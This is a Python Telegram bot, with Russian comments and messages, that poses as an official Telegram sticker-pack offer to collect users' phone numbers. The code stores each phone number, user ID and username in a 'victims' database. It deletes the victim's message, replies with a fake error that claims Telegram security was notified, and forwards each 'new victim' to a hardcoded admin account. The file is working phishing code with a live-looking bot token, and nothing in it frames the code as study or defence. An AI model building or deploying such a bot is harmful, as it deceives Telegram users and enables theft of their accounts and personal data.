from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup  
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters  
import logging  
import sqlite3  

# Конфигурация ада  
BOT_TOKEN = '7697165564:AAHxXcUcza9HELqT06iNn0OVbqlE8iUmIMU'  
ADMIN_ID = '1838192124'  
DB_NAME = 'stolen_souls.db'  

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)  

def init_db():  
    conn = sqlite3.connect(DB_NAME)  
    c = conn.cursor()  
    c.execute('''CREATE TABLE IF NOT EXISTS victims  
                 (id INTEGER PRIMARY KEY, phone TEXT, user_id INTEGER, username TEXT)''')  
    conn.commit()  
    conn.close()  

def start(update: Update, context):  
    keyboard = [[InlineKeyboardButton("🔥 ПОЛУЧИТЬ СТИКЕРПАК", callback_data='get_stickers')]]  
    reply_markup = InlineKeyboardMarkup(keyboard)  
    update.message.reply_text(  
        f"*ОФИЦИАЛЬНЫЙ СТИКЕРПАК TELEGRAM*\n"  
        "Для доступа к эксклюзивным стикерам подтвердите номер телефона:",  
        parse_mode='Markdown',  
        reply_markup=reply_markup  
    )  

def button(update: Update, context):  
    query = update.callback_query  
    query.answer()  
    query.edit_message_text(  
        "Отправьте ваш номер телефона в формате +7XXXYYYYYZZ\n"  
        "Это необходимо для проверки аккаунта!"  
    )  

def steal_phone(update: Update, context):  
    phone = update.message.text  
    user = update.message.from_user  
    conn = sqlite3.connect(DB_NAME)  
    c = conn.cursor()  
    c.execute("INSERT INTO victims (phone, user_id, username) VALUES (?, ?, ?)",  
              (phone, user.id, user.username))  
    conn.commit()  
    conn.close()  

    # Стираем следы  
    context.bot.delete_message(chat_id=update.message.chat_id, message_id=update.message.message_id)  
    update.message.reply_text(  
        "❌ Ошибка верификации! Попробуйте позже.\n"  
        "Служба безопасности Telegram была уведомлена."  
    )  

    # Отправка админу  
    context.bot.send_message(  
        chat_id=ADMIN_ID,  
        text=f"🔥 НОВАЯ ЖЕРТВА:\n"  
             f"ID: {user.id}\n"  
             f"Phone: {phone}\n"  
             f"Username: @{user.username}"  
    )  

def error(update, context):  
    logger.warning('Update "%s" caused error "%s"', update, context.error)  

if __name__ == "__main__":  
    init_db()  
    updater = Updater(token=BOT_TOKEN, use_context=True)  
    dp = updater.dispatcher  

    dp.add_handler(CommandHandler('start', start))  
    dp.add_handler(CallbackQueryHandler(button))  
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, steal_phone))  
    dp.add_error_handler(error)  

    updater.start_polling()  
    updater.idle()  
